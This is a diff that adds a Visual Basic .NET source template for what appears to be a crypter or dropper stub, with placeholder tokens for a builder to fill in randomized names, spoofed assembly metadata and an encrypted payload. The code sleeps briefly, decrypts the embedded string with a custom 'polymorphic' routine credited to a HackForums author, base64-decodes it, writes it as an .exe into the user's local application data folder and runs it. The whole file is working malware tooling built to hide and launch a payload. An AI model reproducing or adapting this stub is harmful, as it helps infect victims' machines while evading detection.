@@ -1,0 +1,59 @@
+﻿Imports System, System.IO, Microsoft.VisualBasic, System.Reflection
+<Assembly: AssemblyTitle("ΦA1Φ")> 
+<Assembly: AssemblyDescription("ΦA2Φ")> 
+<Assembly: AssemblyCompany("ΦA3Φ")> 
+<Assembly: AssemblyProduct("ΦA4Φ")> 
+<Assembly: AssemblyCopyright("ΦA5Φ")> 
+<Assembly: AssemblyTrademark("ΦA6Φ")> 
+<Assembly: AssemblyVersion("1.4.1.7")> 
+<Assembly: AssemblyFileVersion("1.5.1.7")> 
+Namespace ΦN1Φ
+    Public Class ΦM1Φ
+        Public Shared Sub Main()
+            Threading.Thread.Sleep(1500)
+            Dim ΦGtmBoiiΦ As String = ΦKSKpPsbΦ
+            Dim ΦThisΦIn4ΦΦ As String = "ΦJZtSgktΦ"
+            Dim ΦDropStringΦ As String = ("ΦDropFileΦ" & ".exe")
+            Dim ΦappdataΦ As String = (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData))
+            Try
+                ΦwriteΦ(ΦappdataΦ & "\" & ΦDropStringΦ, Convert.FromBase64String(ΦF1Φ(ΦGtmBoiiΦ, ΦThisΦIn4ΦΦ)))
+                System.Diagnostics.Process.Start(ΦappdataΦ & "\" & ΦDropStringΦ)
+            Catch ex As Exception
+                MsgBox(ex.Message)
+            End Try
+        End Sub
+        Public Shared Function ΦwriteΦ(ByVal ΦIn1Φ As String, ByVal ΦIn2Φ As Byte())
+            Try
+                File.WriteAllBytes(ΦIn1Φ, ΦIn2Φ)
+            Catch ex As Exception
+            End Try
+        End Function
+        Public Shared Function ΦF1Φ(ByVal ΦIn3Φ As String, ByVal ΦIn4Φ As String) As String
+            'This function decrypts text that was encrypted with the Polymorphic encrypter in this class.
+            'All credits to Ethereal of HackForums.net
+            'Modified slightly by KrypteX for CodeDom string randomization
+            'Please leave the credits.
+            Dim ΦS1Φ As Char() = ΦIn3Φ.ToCharArray()
+            Dim ΦS2Φ As Char() = ΦIn4Φ.ToCharArray()
+            Dim ΦS3Φ As Char() = New Char(ΦIn3Φ.Length - 2) {}
+            Dim ΦS4Φ As Integer = AscW(ΦS1Φ(ΦIn3Φ.Length - 1))
+            ΦS1Φ(ΦIn3Φ.Length - 1) = ControlChars.NullChar
+            Dim ΦS5Φ As Integer = 0
+            For index As Integer = 0 To ΦIn3Φ.Length - 1
+                If index >= ΦIn3Φ.Length - 1 Then
+                    Continue For
+                End If
+                If ΦS5Φ >= ΦS2Φ.Length Then
+                    ΦS5Φ = 0
+                End If
+                Dim ΦS6Φ As Integer = AscW(ΦS1Φ(index))
+                Dim ΦS7Φ As Integer = AscW(ΦS2Φ(ΦS5Φ))
+                Dim ΦS8Φ As Integer = ΦS6Φ - ΦS4Φ - ΦS7Φ
+                ΦS3Φ(index) = Convert.ToChar(ΦS8Φ)
+                ΦS5Φ += 1
+            Next
+            Dim ΦS9Φ As New String(ΦS3Φ)
+            Return ΦS9Φ
+        End Function
+    End Class
+End Namespace
